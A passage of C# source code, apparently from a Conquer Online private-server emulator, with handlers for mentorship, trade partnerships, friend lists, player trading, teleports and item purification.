                if (ma.Dynamic == 1)
                {
                    uint EnroleDate = (uint)(DateTime.Now.Year * 10000 + DateTime.Now.Month * 100 + DateTime.Now.Day);
                    MentorInformation Information = new MentorInformation(true);
                    Information.Mentor_Type = 1;
                    Information.Mentor_ID = Target.Entity.UID;
                    Information.Apprentice_ID = client.Entity.UID;
                    Information.Enrole_Date = EnroleDate;
                    Information.Mentor_Level = Target.Entity.Level;
                    Information.Mentor_Class = Target.Entity.Class;
                    Information.Mentor_PkPoints = Target.Entity.PKPoints;
                    Information.Mentor_Mesh = Target.Entity.Mesh;
                    Information.Mentor_Online = true;
                    Information.Shared_Battle_Power = client.Entity.BattlePowerFrom(Target.Entity);
                    Information.String_Count = 3;
                    Information.Mentor_Name = Target.Entity.Name;
                    Information.Apprentice_Name = client.Entity.Name;
                    Information.Mentor_Spouse_Name = Target.Entity.Spouse;

                    client.Send(Information);
                    client.Mentor = new MTA.Game.ConquerStructures.Society.Mentor();
                    client.Mentor.ID = Target.Entity.UID;
                    client.Mentor.Name = Target.Entity.Name;
                    client.Mentor.EnroleDate = EnroleDate;
                    client.ReviewMentor();

                    ApprenticeInformation AppInfo = new ApprenticeInformation();
                    AppInfo.Apprentice_ID = client.Entity.UID;
                    AppInfo.Apprentice_Level = client.Entity.Level;
                    AppInfo.Apprentice_Name = client.Entity.Name;
                    AppInfo.Apprentice_Online = true;
                    AppInfo.Apprentice_Class = client.Entity.Class;
                    AppInfo.Apprentice_PkPoints = client.Entity.PKPoints;
                    AppInfo.Apprentice_Spouse_Name = client.Entity.Spouse;
                    AppInfo.Enrole_date = EnroleDate;
                    AppInfo.Mentor_ID = Target.Entity.UID;
                    AppInfo.Mentor_Mesh = Target.Entity.Mesh;
                    AppInfo.Mentor_Name = Target.Entity.Name;
                    AppInfo.Type = 2;
                    Target.Send(AppInfo);
                    Target.Apprentices.Add(client.Entity.UID, new MTA.Game.ConquerStructures.Society.Apprentice()
                    {
                        ID = client.Entity.UID,
                        Name = client.Entity.Name,
                        EnroleDate = EnroleDate
                    });
                    Database.KnownPersons.AddMentor(client.Mentor, Target.Apprentices[client.Entity.UID]);
                }
                else
                {
                    Target.Send(new Message(client.Entity.Name + " declined your request.", System.Drawing.Color.Beige, Message.Talk));
                }
            }
        }
        #endregion
        #region TradePartners
        static void RequestTradePartnership(TradePartner partner, Client.GameState client)
        {
            if (client.Screen.Contains(partner.UID))
            {
                var Client = Kernel.GamePool[partner.UID];
                if (Client != null)
                {
                    if (Client.TradePartnerRequest != client.Entity.UID)
                    {
                        client.TradePartnerRequest = Client.Entity.UID;
                        partner.UID = client.Entity.UID;
                        partner.Name = client.Entity.Name;
                        Client.Send(partner);
                    }
                    else
                    {
                        DateTime Now = DateTime.Now;
                        client.Partners.Add(Client.Entity.UID, new MTA.Game.ConquerStructures.Society.TradePartner()
                        {
                            ID = Client.Entity.UID,
                            Name = Client.Entity.Name,
                            ProbationStartedOn = Now
                        });
                        Client.Partners.Add(client.Entity.UID, new MTA.Game.ConquerStructures.Society.TradePartner()
                        {
                            ID = Client.Entity.UID,
                            Name = Client.Entity.Name,
                            ProbationStartedOn = Now
                        });
                        client.Send(new TradePartner(true)
                        {
                            UID = Client.Entity.UID,
                            Type = TradePartner.AddPartner,
                            Name = Client.Entity.Name,
                            HoursLeft = (int)(new TimeSpan(Now.AddDays(3).Ticks).TotalHours - new TimeSpan(Now.Ticks).TotalHours),
                            Online = true
                        });
                        Client.Send(new TradePartner(true)
                        {
                            UID = client.Entity.UID,
                            Type = TradePartner.AddPartner,
                            Name = client.Entity.Name,
                            HoursLeft = (int)(new TimeSpan(Now.AddDays(3).Ticks).TotalHours - new TimeSpan(Now.Ticks).TotalHours),
                            Online = true
                        });
                        Database.KnownPersons.AddPartner(client, client.Partners[Client.Entity.UID]);
                        client.SendScreen(new Message(Client.Entity.Name + " has begun " + client.Entity.Name + " a partnership probation for three days!", System.Drawing.Color.Red, Message.TopLeft), true);
                    }
                }
            }
        }
        static void RejectPartnership(TradePartner partner, Client.GameState client)
        {
            client.TradePartnerRequest = 0;
            var Client = Kernel.GamePool[partner.UID];
            if (Client != null)
            {
                Client.Send(new TradePartner(true)
                {
                    UID = client.Entity.UID,
                    Type = TradePartner.RejectRequest,
                    Name = client.Entity.Name,
                    Online = true
                });
            }
        }
        static void BreakPartnership(TradePartner partner, Client.GameState client)
        {
            if (client.Partners.ContainsKey(partner.UID))
            {
                GameState Client;
                if (Kernel.GamePool.TryGetValue(partner.UID, out Client))
                {
                    Client.Partners.Remove(client.Entity.UID);
                    Client.Send(new TradePartner(true)
                    {
                        UID = client.Entity.UID,
                        Type = TradePartner.BreakPartnership,
                        Name = "",
                        Online = false
                    });
                    Client.Send(new Message(client.Entity.Name + " has broken the partnership with you.", System.Drawing.Color.Red, Message.TopLeft));

                    client.Send(new TradePartner(true)
                    {
                        UID = partner.UID,
                        Type = TradePartner.BreakPartnership,
                        Name = "",
                        Online = false
                    });
                    client.Partners.Remove(partner.UID);
                    Database.KnownPersons.RemovePartner(client, partner.UID);
                    Client.Send(new Message("You have broken the partnership with " + partner.Name + ".", System.Drawing.Color.Red, Message.TopLeft));
                }
            }
        }
        #endregion
        #region KnownPersons
        static void RemoveFriend(KnownPersons knownperson, Client.GameState client)
        {
            if (client.Friends.ContainsKey(knownperson.UID))
            {
                Game.ConquerStructures.Society.Friend friend = client.Friends[knownperson.UID];
                if (friend.IsOnline)
                {
                    friend.Client.Friends.Remove(client.Entity.UID);
                    friend.Client.Send(new KnownPersons(true)
                    {
                        UID = client.Entity.UID,
                        Type = KnownPersons.RemovePerson,
                        Name = "",
                        Online = false
                    });
                }
                client.Friends.Remove(friend.ID);
                client.Send(new KnownPersons(true)
                {
                    UID = friend.ID,
                    Type = KnownPersons.RemovePerson,
                    Name = "",
                    Online = false
                });
                Database.KnownPersons.RemoveFriend(client, friend.ID);
            }
        }
        static void RemoveEnemy(KnownPersons knownperson, Client.GameState client)
        {
            if (client.Enemy.ContainsKey(knownperson.UID))
            {
                Game.ConquerStructures.Society.Enemy enemy = client.Enemy[knownperson.UID];

                client.Enemy.Remove(enemy.ID);
                client.Send(new KnownPersons(true)
                {
                    UID = enemy.ID,
                    Type = KnownPersons.RemovePerson,
                    Name = "",
                    Online = false
                });
                Database.KnownPersons.RemoveEnemy(client, enemy.ID);
            }
        }
        static void AcceptFriend(KnownPersons knownperson, Client.GameState client)
        {
            if (!client.Friends.ContainsKey(knownperson.UID))
            {
                if (Kernel.GamePool.ContainsKey(knownperson.UID))
                {
                    Client.GameState Client = Kernel.GamePool[knownperson.UID];
                    if (Client != null)
                    {
                        if (client != null)
                        {
                            if (client.Socket.Alive)
                            {
                                if (!Client.Friends.ContainsKey(client.Entity.UID))
                                {
                                    client.Friends.Add(Client.Entity.UID, new MTA.Game.ConquerStructures.Society.Friend()
                                    {
                                        ID = Client.Entity.UID,
                                        Name = Client.Entity.Name
                                    });
                                    Client.Friends.Add(client.Entity.UID, new MTA.Game.ConquerStructures.Society.Friend()
                                    {
                                        ID = client.Entity.UID,
                                        Name = client.Entity.Name
                                    });
                                    client.Send(new KnownPersons(true)
                                    {
                                        UID = Client.Entity.UID,
                                        Type = KnownPersons.AddFriend,
                                        Name = Client.Entity.Name,
                                        NobilityRank = Client.Entity.NobilityRank,
                                        IsBoy = PacketHandler.IsBoy(Client.Entity.Body),
                                        Online = true
                                    });
                                    Client.Send(new KnownPersons(true)
                                    {
                                        UID = client.Entity.UID,
                                        Type = KnownPersons.AddFriend,
                                        Name = client.Entity.Name,
                                        NobilityRank = client.Entity.NobilityRank,
                                        IsBoy = PacketHandler.IsBoy(client.Entity.Body),
                                        Online = true
                                    });
                                    Database.KnownPersons.AddFriend(client, client.Friends[Client.Entity.UID]);

                                }
                            }
                        }
                    }
                }
            }
        }
        static void AddFriend(KnownPersons knownperson, Client.GameState client)
        {
            if (!client.Friends.ContainsKey(knownperson.UID))
            {
                if (Kernel.GamePool.ContainsKey(knownperson.UID))
                {
                    Client.GameState Client = Kernel.GamePool[knownperson.UID];
                    if (Client != null)
                    {
                        Client.Send(new PopupLevelBP()
                        {
                            Requester = client.Entity.UID,
                            Receiver = Client.Entity.UID,
                            Level = client.Entity.Level,
                            BattlePower = (uint)client.Entity.BattlePower
                        });
                        Client.Send(new KnownPersons(true)
                        {
                            UID = client.Entity.UID,
                            Type = KnownPersons.RequestFriendship,
                            Name = client.Entity.Name,
                            NobilityRank = client.Entity.NobilityRank,
                            IsBoy = PacketHandler.IsBoy(client.Entity.Body),
                            Online = true
                        });
                    }
                }
            }
        }

        public static void AddEnemy(Client.GameState client, Client.GameState enemy)
        {
            if (!client.Enemy.ContainsKey(enemy.Entity.UID))
            {
                client.Enemy.Add(enemy.Entity.UID, new MTA.Game.ConquerStructures.Society.Enemy()
                {
                    ID = enemy.Entity.UID,
                    Name = enemy.Entity.Name
                });
                client.Send(new KnownPersons(true)
                {
                    UID = enemy.Entity.UID,
                    Type = KnownPersons.AddEnemy,
                    Name = enemy.Entity.Name,
                    NobilityRank = client.Entity.NobilityRank,
                    IsBoy = PacketHandler.IsBoy(client.Entity.Body),
                    Online = true
                });
                Database.KnownPersons.AddEnemy(client, client.Enemy[enemy.Entity.UID]);
            }
        }

        #endregion

        public static void Teleport(Client.GameState client, VIPTeleportLocations Location)
        {
            switch (Location)
            {
                case VIPTeleportLocations.TwinCity:
                case VIPTeleportLocations.TCSquare: client.Entity.Teleport((ushort)Game.Enums.Maps.TwinCity, 304, 278); break;
                case VIPTeleportLocations.WPFarm: client.Entity.Teleport((ushort)Game.Enums.Maps.TwinCity, 266, 174); break;
                case VIPTeleportLocations.WPBridge: client.Entity.Teleport((ushort)Game.Enums.Maps.TwinCity, 470, 578); break;
                case VIPTeleportLocations.WPAltar: client.Entity.Teleport((ushort)Game.Enums.Maps.TwinCity, 436, 693); break;
                case VIPTeleportLocations.WPApparation: client.Entity.Teleport((ushort)Game.Enums.Maps.TwinCity, 212, 450); break;
                case VIPTeleportLocations.WPPoltergiest: client.Entity.Teleport((ushort)Game.Enums.Maps.TwinCity, 90, 285); break;
                case VIPTeleportLocations.WPTurtledove: client.Entity.Teleport((ushort)Game.Enums.Maps.TwinCity, 627, 374); break;

                case VIPTeleportLocations.PhoenixCastle:
                case VIPTeleportLocations.PCSqaure: client.Entity.Teleport((ushort)Game.Enums.Maps.PhoenixCastle, 188, 264); break;
                case VIPTeleportLocations.MFWaterCave: client.Entity.Teleport((ushort)Game.Enums.Maps.PhoenixCastle, 380, 31); break;
                case VIPTeleportLocations.MFVillage: client.Entity.Teleport((ushort)Game.Enums.Maps.PhoenixCastle, 785, 472); break;
                case VIPTeleportLocations.MFLake: client.Entity.Teleport((ushort)Game.Enums.Maps.PhoenixCastle, 369, 568); break;
                case VIPTeleportLocations.MFMineCave: client.Entity.Teleport((ushort)Game.Enums.Maps.PhoenixCastle, 924, 560); break;
                case VIPTeleportLocations.MFBridge: client.Entity.Teleport((ushort)Game.Enums.Maps.PhoenixCastle, 648, 567); break;
                case VIPTeleportLocations.MFToApeCity: client.Entity.Teleport((ushort)Game.Enums.Maps.PhoenixCastle, 475, 841); break;

                case VIPTeleportLocations.ApeCity:
                case VIPTeleportLocations.ACSquare: client.Entity.Teleport((ushort)Game.Enums.Maps.ApeMoutain, 565, 562); break;
                case VIPTeleportLocations.ACSouth: client.Entity.Teleport((ushort)Game.Enums.Maps.ApeMoutain, 699, 640); break;
                case VIPTeleportLocations.ACEast: client.Entity.Teleport((ushort)Game.Enums.Maps.ApeMoutain, 624, 337); break;
                case VIPTeleportLocations.ACNorth: client.Entity.Teleport((ushort)Game.Enums.Maps.ApeMoutain, 200, 224); break;
                case VIPTeleportLocations.ACWest: client.Entity.Teleport((ushort)Game.Enums.Maps.ApeMoutain, 322, 621); break;

                case VIPTeleportLocations.DesertCity:
                case VIPTeleportLocations.DCSquare: client.Entity.Teleport((ushort)Game.Enums.Maps.DesertCity, 500, 650); break;
                case VIPTeleportLocations.DCSouth: client.Entity.Teleport((ushort)Game.Enums.Maps.DesertCity, 758, 750); break;
                case VIPTeleportLocations.DCVillage: client.Entity.Teleport((ushort)Game.Enums.Maps.DesertCity, 480, 271); break;
                case VIPTeleportLocations.DCMoonSpring: client.Entity.Teleport((ushort)Game.Enums.Maps.DesertCity, 291, 450); break;
                case VIPTeleportLocations.DCAncientMaze: client.Entity.Teleport((ushort)Game.Enums.Maps.DesertCity, 87, 321); break;

                case VIPTeleportLocations.BirdIland:
                case VIPTeleportLocations.BISquare: client.Entity.Teleport((ushort)Game.Enums.Maps.BirdIsland, 723, 573); break;
                case VIPTeleportLocations.BICenter: client.Entity.Teleport((ushort)Game.Enums.Maps.BirdIsland, 585, 593); break;
                case VIPTeleportLocations.BISouthWest: client.Entity.Teleport((ushort)Game.Enums.Maps.BirdIsland, 562, 786); break;
                case VIPTeleportLocations.BINorthWest: client.Entity.Teleport((ushort)Game.Enums.Maps.BirdIsland, 125, 323); break;
                case VIPTeleportLocations.BINorthEast: client.Entity.Teleport((ushort)Game.Enums.Maps.BirdIsland, 125, 323); break;
            }
        }
        #region Attack
        public static void Attack(Attack attack, Client.GameState client)
        {
            client.Entity.RemoveMagicDefender();
            client.Entity.AttackPacket = attack;
            new Game.Attacking.Handle(attack, client.Entity, null);
        }
        #endregion
        #region Trade
        static void RequestTrade(Trade trade, Client.GameState client)
        {
            Client.GameState _client = null;
            if (Kernel.GamePool.TryGetValue(trade.dwParam, out _client))
            {
                if (_client.Trade.InTrade || client.Trade.InTrade || client.Entity.UID == trade.dwParam || Kernel.GetDistance(client.Entity.X, client.Entity.Y, _client.Entity.X, _client.Entity.Y) > Constants.pScreenDistance)
                {
                    client.Send(Constants.TradeInProgress);
                    return;
                }
                client.Trade.TraderUID = _client.Entity.UID;
                if (_client.Trade.TraderUID == client.Entity.UID)
                {
                    _client.Trade.InTrade = client.Trade.InTrade = true;
                    trade.Type = Trade.ShowTable;
                    client.Send(trade);
                    trade.dwParam = client.Entity.UID;
                    _client.Send(trade);
                }
                else
                {

                    client.Send(Constants.TradeRequest);
                    trade.dwParam = client.Entity.UID;
                    PopupLevelBP request = new PopupLevelBP();
                    request.Requester = client.Entity.UID;
                    request.Receiver = _client.Entity.UID;
                    request.Level = client.Entity.Level;
                    request.BattlePower = (uint)client.Entity.BattlePower;

                    request.Spouse = _client.Entity.Name == client.Entity.Spouse;
                    request.Friend = client.Friends.ContainsKey(_client.Entity.UID);
                    request.TradePartner = client.Partners.ContainsKey(_client.Entity.UID);
                    if (client.Mentor != null)
                        request.Mentor = client.Mentor.ID == _client.Entity.UID;
                    request.Apprentice = client.Apprentices.ContainsKey(_client.Entity.UID);
                    if (client.Team != null)
                        request.Teammate = client.Team.IsTeammate(_client.Entity.UID);
                    if (client.Guild != null)
                        request.GuildMember = client.Guild.Members.ContainsKey(_client.Entity.UID);
                    request.Enemy = client.Enemy.ContainsKey(_client.Entity.UID);

                    _client.Send(request);
                    _client.Send(trade);
                    _client.Send(request);

                }
            }
        }
        static void CloseTrade(Trade trade, Client.GameState client)
        {
            Client.GameState _client = null;
            if (Kernel.GamePool.TryGetValue(client.Trade.TraderUID, out _client))
            {
                _client.Trade = new Game.ConquerStructures.Trade();
                client.Trade = new Game.ConquerStructures.Trade();
                trade.Type = Trade.HideTable;
                trade.dwParam = _client.Entity.UID;
                client.Send(trade);
                trade.dwParam = client.Entity.UID;
                _client.Send(trade);
            }
        }
        static void AddTradeItem(Trade trade, Client.GameState client)
        {
            ConquerItem item = null;
            if (client.Inventory.TryGetItem(trade.dwParam, out item))
            {
                Client.GameState _client = null;
                if (Kernel.GamePool.TryGetValue(client.Trade.TraderUID, out _client) && !Constants.SoulList.Contains((int)item.ID) && !Constants.SoulList.Contains((int)item.Purification.PurificationItemID))
                {
                    Database.ConquerItemInformation infos = new Database.ConquerItemInformation(item.ID, 0);
                    if (_client.Inventory.Count + client.Trade.Items.Count >= 40 || client.Trade.Items.Count == 20)
                    {
                        trade.Type = Trade.RemoveItem;
                        client.Send(trade);
                        client.Send(Constants.TradeInventoryFull);
                        return;
                    }
                    if ((client.Account.State == Database.AccountTable.AccountState.GM || client.Account.State == Database.AccountTable.AccountState.GM || _client.Account.State == Database.AccountTable.AccountState.GM || _client.Account.State == Database.AccountTable.AccountState.GM))
                    {
                        client.Trade.Items.Add(item);
                        item.Mode = Game.Enums.ItemMode.Trade;
                        item.Send(_client);
                        return;
                    }
                    if (infos.BaseInformation.Type != Database.ConquerItemBaseInformation.ItemType.Dropable || (item.Lock != 0 && !client.Partners.ContainsKey(_client.Entity.UID) && !client.Partners[_client.Entity.UID].StillOnProbation) || item.Bound || item.Suspicious)
                    {
                        trade.Type = Trade.RemoveItem;
                        client.Send(trade);
                        return;
                    }
                    client.Trade.Items.Add(item);
                    item.Mode = Game.Enums.ItemMode.Trade;
                    item.Send(_client);
                }
                else
                {
                    Network.GamePackets.NpcReply npc = new Network.GamePackets.NpcReply(6, "you cant trade any Special Soul only can sell in market in Shop more than 1 kk cps ok?");
                    npc.OptionID = 255;
                    client.Send(npc.ToArray());
                }
            }
        }
        static void SetTradeMoney(Trade trade, Client.GameState client)
        {
            Client.GameState _client = null;
            if (Kernel.GamePool.TryGetValue(client.Trade.TraderUID, out _client))
            {
                if (client.Trade.Money == 0)
                {
                    if (client.Entity.Money >= trade.dwParam)
                    {
                        client.Trade.Money = trade.dwParam;
                        trade.Type = Trade.ShowMoney;
                        _client.Send(trade);
                    }
                    else
                        CloseTrade(trade, client);
                }
            }
        }
        static void SetTradeConquerPoints(Trade trade, Client.GameState client)
        {
            Client.GameState _client = null;
            if (Kernel.GamePool.TryGetValue(client.Trade.TraderUID, out _client))
            {
                if (client.Trade.ConquerPoints == 0)
                {
                    if (client.Entity.ConquerPoints >= trade.dwParam)
                    {
                        client.Trade.ConquerPoints = trade.dwParam;
                        trade.Type = Trade.ShowConquerPoints;
                        _client.Send(trade);
                    }
                    else
                        CloseTrade(trade, client);
                }
            }
        }
        static void AcceptTrade(Trade trade, Client.GameState client)
        {
            Client.GameState _client = null;
            if (Kernel.GamePool.TryGetValue(client.Trade.TraderUID, out _client))
            {
                client.Trade.Accepted = true;
                _client.Send(trade);
                if (_client.Trade.Accepted)
                {
                    lock (client.ItemSyncRoot)
                    {
                        lock (_client.ItemSyncRoot)
                        {
                            if (client.Inventory.Count + _client.Trade.Items.Count <= 40)
                            {
                                foreach (ConquerItem item in _client.Trade.Items)
                                {
                                    if (_client.Inventory.ContainsUID(item.UID))
                                    {
                                        client.Inventory.Add(item, Game.Enums.ItemUse.Move);
                                        _client.Inventory.Remove(item.UID, Game.Enums.ItemUse.None, true);
                                    }
                                }
                            }
                            if (_client.Inventory.Count + client.Trade.Items.Count <= 40)
                            {
                                foreach (ConquerItem item in client.Trade.Items)
                                {
                                    if (client.Inventory.ContainsUID(item.UID))
                                    {
                                        _client.Inventory.Add(item, Game.Enums.ItemUse.Move);
                                        client.Inventory.Remove(item.UID, Game.Enums.ItemUse.None, true);
                                    }
                                }
                            }
                            if (_client.Trade.Money <= _client.Entity.Money)
                            {
                                _client.Entity.Money -= _client.Trade.Money;
                                client.Entity.Money += _client.Trade.Money;
                            }
                            if (client.Trade.Money <= client.Entity.Money)
                            {
                                client.Entity.Money -= client.Trade.Money;
                                _client.Entity.Money += client.Trade.Money;
                            }
                            if (_client.Trade.ConquerPoints <= _client.Entity.ConquerPoints)
                            {
                                _client.Entity.ConquerPoints -= _client.Trade.ConquerPoints;
                                client.Entity.ConquerPoints += _client.Trade.ConquerPoints;
                            }
                            if (client.Trade.ConquerPoints <= client.Entity.ConquerPoints)
                            {
                                client.Entity.ConquerPoints -= client.Trade.ConquerPoints;
                                _client.Entity.ConquerPoints += client.Trade.ConquerPoints;
                            }

                            trade.Type = Trade.HideTable;
                            trade.dwParam = client.Entity.UID;
                            client.Send(trade);
                            trade.dwParam = _client.Entity.UID;
                            _client.Send(trade);

                            Program.AddTradeLog(client.Trade, client.Entity.Name, _client.Trade, _client.Entity.Name);
                            _client.Trade = new Game.ConquerStructures.Trade();
                            client.Trade = new Game.ConquerStructures.Trade();
                            client.Entity.Money = (uint)client.Entity.Money;
                            _client.Entity.Money = (uint)_client.Entity.Money;
                            client.Entity.ConquerPoints = (uint)client.Entity.ConquerPoints;
                            _client.Entity.ConquerPoints = (uint)_client.Entity.ConquerPoints;
                            Database.EntityTable.UpdateCps(client);
                            Database.EntityTable.UpdateCps(_client);
                        }
                    }
                }
            }
        }
        #endregion

        #region ItemHandler
        public static void StabilazeRefinery(ItemAddingStabilization stabilizate, Client.GameState client)
        {
            ConquerItem Item = null;
            if (client.Inventory.TryGetItem(stabilizate.ItemUID, out Item) || (client.Equipment.TryGetItem(stabilizate.ItemUID) != null))
            {
                if (Item == null && client.Inventory.TryGetItem(stabilizate.ItemUID, out Item) == false && (client.Equipment.TryGetItem(stabilizate.ItemUID) != null))
                    Item = client.Equipment.TryGetItem(stabilizate.ItemUID);

                if (Item.ExtraEffect.EffectID != 0)
                {
                    if (Item.ExtraEffect.EffectID != 0)
                    {
                        List<uint> purificationStones = stabilizate.PurificationItems;
                        int sum = 0;
                        List<ConquerItem> PurificationStones = new List<ConquerItem>(purificationStones.Count);

                        for (int i = 0; i < purificationStones.Count; i++)
                        {
                            ConquerItem pItem = null;
                            if (client.Inventory.TryGetItem(purificationStones[i], out pItem))
                            {
                                if (pItem.ID == 723694)
                                {
                                    sum += 10;
                                    PurificationStones.Add(pItem);
                                }
                                if (pItem.ID == 723695)
                                {
                                    sum += 100;
                                    PurificationStones.Add(pItem);
                                }
                            }
                        }
                        if (sum >= Database.DataHolder.PurifyStabilizationPoints((byte)Item.ExtraEffect.EffectLevel))
                        {
                            var Backup = Item.ExtraEffect;
                            Backup.EffectDuration = 0;
                            Item.ExtraEffect = Backup;
                            Item.Send(client);

                            ItemAdding effect = new ItemAdding(true);
                            effect.Type = ItemAdding.StabilizationEffectRefined;
                            effect.Append2(Backup);
                            client.Send(effect);

                            Database.ItemAddingTable.Stabilize(Item.UID, Backup.EffectID);
                            foreach (var item in PurificationStones)
                                client.Inventory.Remove(item, MTA.Game.Enums.ItemUse.Remove);
                        }
                    }
                }
            }
        }
        public static void StabilazeArtifact(ItemAddingStabilization stabilizate, Client.GameState client)
        {
            ConquerItem Item = null;
            if (client.Inventory.TryGetItem(stabilizate.ItemUID, out Item) || (client.Equipment.TryGetItem(stabilizate.ItemUID) != null))
            {
                if (Item == null && client.Inventory.TryGetItem(stabilizate.ItemUID, out Item) == false && (client.Equipment.TryGetItem(stabilizate.ItemUID) != null))
                    Item = client.Equipment.TryGetItem(stabilizate.ItemUID);

                if (Item.Purification.PurificationDuration != 0)
                {
                    if (Item.Purification.PurificationItemID != 0)
                    {
                        List<uint> purificationStones = stabilizate.PurificationItems;
                        int sum = 0;
                        List<ConquerItem> PurificationStones = new List<ConquerItem>(purificationStones.Count);

                        for (int i = 0; i < purificationStones.Count; i++)
                        {
                            ConquerItem pItem = null;
                            if (client.Inventory.TryGetItem(purificationStones[i], out pItem))
                            {
                                if (pItem.ID == 723694)
                                {
                                    sum += 10;
                                    PurificationStones.Add(pItem);
                                }
                                if (pItem.ID == 723695)
                                {
                                    sum += 100;
                                    PurificationStones.Add(pItem);
                                }
                            }
                        }
                        if (sum >= Database.DataHolder.PurifyStabilizationPoints((byte)Item.Purification.PurificationLevel))
                        {
                            var Backup = Item.Purification;
                            Backup.PurificationDuration = 0;
                            Item.Purification = Backup;
                            Item.Send(client);

                            ItemAdding effect = new ItemAdding(true);
                            effect.Type = ItemAdding.StabilizationEffect;
                            effect.Append2(Backup);
                            client.Send(effect);

                            Database.ItemAddingTable.Stabilize(Item.UID, Backup.PurificationItemID);
                            foreach (var item in PurificationStones)
                                client.Inventory.Remove(item, MTA.Game.Enums.ItemUse.Remove);
                        }
                    }
                }
                if (Item.ExtraEffect.EffectID != 0)
                {
                    if (Item.ExtraEffect.EffectID != 0)
                    {
                        List<uint> purificationStones = stabilizate.PurificationItems;
                        int sum = 0;
                        List<ConquerItem> PurificationStones = new List<ConquerItem>(purificationStones.Count);

                        for (int i = 0; i < purificationStones.Count; i++)
                        {
                            ConquerItem pItem = null;
                            if (client.Inventory.TryGetItem(purificationStones[i], out pItem))
                            {
                                if (pItem.ID == 723694)
                                {
                                    sum += 10;
                                    PurificationStones.Add(pItem);
                                }
                                if (pItem.ID == 723695)
                                {
                                    sum += 100;
                                    PurificationStones.Add(pItem);
                                }
                            }
                        }
                        if (sum >= Database.DataHolder.PurifyStabilizationPoints((byte)Item.ExtraEffect.EffectLevel))
                        {
                            var Backup = Item.ExtraEffect;
                            Backup.EffectDuration = 0;
                            Item.ExtraEffect = Backup;
                            Item.Send(client);

                            ItemAdding effect = new ItemAdding(true);
                            effect.Type = ItemAdding.StabilizationEffectRefined;
                            effect.Append2(Backup);
                            client.Send(effect);

                            Database.ItemAddingTable.Stabilize(Item.UID, Backup.EffectID);
                            foreach (var item in PurificationStones)
                                client.Inventory.Remove(item, MTA.Game.Enums.ItemUse.Remove);
                        }
                    }
                }
            }
        }

        public static bool CanPurify(GameState Client, byte MeteorsNeeded)
        {
            int Stillneeded = MeteorsNeeded;
            Stillneeded -= Client.Inventory.Objects.Where(x => x.ID == 720027).Count() * 10;
            Stillneeded -= Client.Inventory.Objects.Where(x => x.ID == 1088001).Count();
            if (Stillneeded > 0)
                return false;
            return true;
        }
        public static void PurifyItem(Purification ps, Client.GameState client)
        {
            ConquerItem Item = null, AddingItem = null;
            if (client.Inventory.TryGetItem(ps.ItemUID, out Item) && client.Inventory.TryGetItem(ps.AddUID, out AddingItem))
            {
                if (ps.ItemUID == ps.AddUID)
                    return;

                var PurifyInformation = Database.ConquerItemInformation.BaseInformations[AddingItem.ID];
                var ItemInformation = Database.ConquerItemInformation.BaseInformations[Item.ID];
                if (PurifyInformation.PurificationLevel > 0)
                {
                    if (ItemInformation.Level >= PurifyInformation.Level)
                    {
                        var doPurify = false;
                        if (client.Inventory.Contains(720027, (ushort)(PurifyInformation.PurificationMeteorNeed / 10)))
                        {
                            client.Inventory.Remove(720027, (byte)(PurifyInformation.PurificationMeteorNeed / 10));
                            doPurify = true;
                        }
                        if (!doPurify && client.Inventory.Contains(1088001, PurifyInformation.PurificationMeteorNeed))
                        {
                            client.Inventory.Remove(1088001, (byte)PurifyInformation.PurificationMeteorNeed);
                            doPurify = true;
                        }
                        if (doPurify)
                        {
                            if (Item.Purification.PurificationItemID > 0)
                                Database.ItemAddingTable.RemoveAdding(Item.UID, Item.Purification.PurificationItemID);
                            client.Send(ps);
                            ItemAdding.Purification_ purify = new ItemAdding.Purification_();
                            purify.AddedOn = DateTime.Now;
                            purify.Available = true;
                            purify.ItemUID = ps.ItemUID;
                            purify.PurificationLevel = PurifyInformation.PurificationLevel;
                            if (client.Entity.VIPLevel == 1)
                                purify.PurificationDuration = 8 * 24 * 60 * 60;
                            else if (client.Entity.VIPLevel == 2)
                                purify.PurificationDuration = 9 * 24 * 60 * 60;
                            else if (client.Entity.VIPLevel == 3)
                                purify.PurificationDuration = 11 * 24 * 60 * 60;
                            else if (client.Entity.VIPLevel == 4)
                                purify.PurificationDuration = 14 * 24 * 60 * 60;
                            else if (client.Entity.VIPLevel == 5)
                                purify.PurificationDuration = 14 * 24 * 60 * 60;
                            else if (client.Entity.VIPLevel == 6)
                                purify.PurificationDuration = 14 * 24 * 60 * 60;
                            else if (client.Entity.VIPLevel == 0)
                                purify.PurificationDuration = 7 * 24 * 60 * 60;
                            purify.PurificationItemID = AddingItem.ID;
                            Database.ItemAddingTable.AddPurification(purify);
                            Item.Purification = purify;
                            Item.Mode = MTA.Game.Enums.ItemMode.Update;
                            Item.Send(client);
                            client.Inventory.Remove(AddingItem, MTA.Game.Enums.ItemUse.Remove);
                            client.CalculateStatBonus();
                            client.LoadItemStats();
                            //client.ReshareClan();
                            if (client.Team != null)
                                foreach (var teammate in client.Team.Teammates)
                                    //teammate.ReshareClan();
                                    client.CalculateHPBonus();
                            client.Send(ps);
                        }
                    }
                }
            }
        }
        public static void PurifyRefinery(Purification ps, Client.GameState client)
        {
            ConquerItem item = null, refine = null;
            client.Inventory.TryGetItem(ps.ItemUID, out item);
            client.Inventory.TryGetItem(ps.AddUID, out refine);
            if (refine != null)
            {
                if (item == null)
                    item = client.Equipment.TryGetItem(ps.ItemUID);
                if (item != null)
                {
                    Refinery.RefineryItem refineStats;
                    if (Kernel.DatabaseRefinery.TryGetValue(refine.ID, out refineStats))
                    {
                        Boolean valid = true;
                        if (item.Position < 100)
                        {
                            UInt32 iType = item.ID / 1000;
                            Positions pos = GetPositionFromID(item.ID);
                            if (pos != (Positions)refineStats.Position)
                                valid = false;
                            if (pos == Positions.Garment)
                                return;
                            if (pos == Positions.Steed)
                                return;
                            if (pos == Positions.Bottle)
                                return;
                            if (pos == Positions.SteedArmor)
                                return;
                            if (pos == Positions.SteedTalisman)
                                return;
                            if (pos == Positions.LeftAccessory)
                                return;
                            if (pos == Positions.RightAccessory)
                                return;
                            if (pos == Positions.DefenceTalisman)
                                return;
                            if (pos == Positions.AttackTalisman)
                                return;
                            else if (refineStats.Position == 5)
                                valid = item.IsTwoHander();
                            if (iType == refineStats.Position)
                                valid = true;
                        }
                        else
                        {
                            if (item.GetItemType() != (ConquerItem.ItemTypes)refineStats.Position)
                                valid = false;
                        }

                        if (valid)
                        {
                            if (item.Position == 7)
                                return;
                            if (item.Position == 9)
                                return;
                            if (item.Position == 11)
                                return;
                            if (item.Position == 12)
                                return;
                            if (item.Position == 10)
                                return;
                            if (item.Position == 18)
                                return;
                            if (item.Position == 17)
                                return;
                            if (item.Position == 15)
                                return;
